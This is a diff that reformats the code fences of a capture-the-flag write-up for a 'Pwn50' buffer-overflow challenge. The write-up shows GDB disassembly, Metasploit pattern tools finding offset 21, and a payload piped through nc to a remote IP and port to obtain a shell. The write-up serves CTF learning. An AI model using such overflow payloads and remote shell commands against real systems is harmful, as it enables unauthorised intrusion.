@@ -5,12 +5,13 @@ task : nc 54.153.19.139 5251
 just write something when connect , its always UP
 
 ## output
-We try to connect and input a lot of char:
+We try to input a lot of char locally on the binary:
 
 ```
 ~/Documents/challenge/CTF/Bugs\_Bunny/Pwn50$ ./pwn50 
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-Erreur de segmentation (core dumped)```
+Erreur de segmentation (core dumped)
+```
 
 So we open the binary in GDB:
 
@@ -76,14 +77,16 @@ Dump of assembler code for function main:
    0x00000000004006d7 <+145>:	pop    rbx
    0x00000000004006d8 <+146>:	pop    rbp
    0x00000000004006d9 <+147>:	ret    
-End of assembler dump.```
+End of assembler dump.
+```
 
 We remark that there are 3 cmp *al* versus *0x62 0x75 0x67*, which in ASCII world means bug. Then we look which are the char of the overflow that are compared to *0xdefaced*.
 
 First we generate a pattern:
 ```
 # /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab```
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
+```
 
 Then we use the pattern as input after the bug string:
 ```
@@ -144,12 +147,14 @@ Legend: code, data, rodata, value
 
 Breakpoint 1, 0x0000000000400687 in main ()
 gdb-peda$ x/xw $rbp-0x18
-0x7fffffffdcd8:	0x41376141```
+0x7fffffffdcd8:	0x41376141
+```
 
 Then we use pattern\_offset to know the offset that is compared to *0xdefaced*:
 ```
 # /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 50 -q 0x41376141
-[*] Exact match at offset 21```
+[*] Exact match at offset 21
+```
 
 We test locally if it's the right solution:
 ```
@@ -157,8 +162,11 @@ We test locally if it's the right solution:
 ~/Documents/challenge/CTF/Bugs_Bunny/Pwn50$ (cat input.hex ; cat) | ./pwn50 
 Cool Stuff :p!
 whoami
-tenflo```
+tenflo
+```
 
 So we can have our shell on the server with:
-```(cat input.hex ; cat ) | nc 54.153.19.139 5251```
+```
+(cat input.hex ; cat ) | nc 54.153.19.139 5251
+```
 
